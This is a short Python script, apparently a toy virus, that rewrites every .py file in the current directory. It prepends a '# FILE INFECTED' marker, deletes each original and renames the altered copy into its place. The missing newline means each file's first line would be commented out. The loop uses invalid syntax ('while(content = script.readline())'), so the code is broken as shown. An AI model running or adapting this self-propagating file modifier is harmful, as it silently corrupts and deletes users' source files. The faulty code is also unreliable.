import os 
import glob


filenames = glob.glob('*.py')

for filename in filenames:
	with open(filename,'r') as script:
	
		# Write to a new file, instead of reading the whole  
		# file into memory, to avoid issues with large files
		
		with open(f'{filename}.infected','w') as infected: 
		
			infection = '# FILE INFECTED'
			
			infected.write(infection)
			
			while(content = script.readline()):
				infected.write(content)
	os.remove(filename)
	os.rename(f'{filename}.infected', filename)
